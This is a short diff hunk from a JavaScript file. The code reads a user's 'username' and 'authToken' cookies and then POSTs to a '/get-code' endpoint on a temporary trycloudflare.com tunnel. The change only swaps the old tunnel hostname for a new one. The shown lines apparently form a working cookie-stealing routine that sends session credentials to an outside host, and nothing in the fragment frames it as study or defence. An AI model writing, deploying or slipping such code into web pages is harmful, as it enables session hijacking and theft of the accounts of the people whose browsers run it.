@@ -12,7 +12,7 @@
         const username = getCookie('username') || 'Bilinmeyen Kullanıcı';
         const authToken = getCookie('authToken') || 'Token Yok';
 
-        fetch('https://palm-porter-thousands-efficient.trycloudflare.com/get-code', {
+        fetch('https://desire-vid-acts-lack.trycloudflare.com/get-code', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
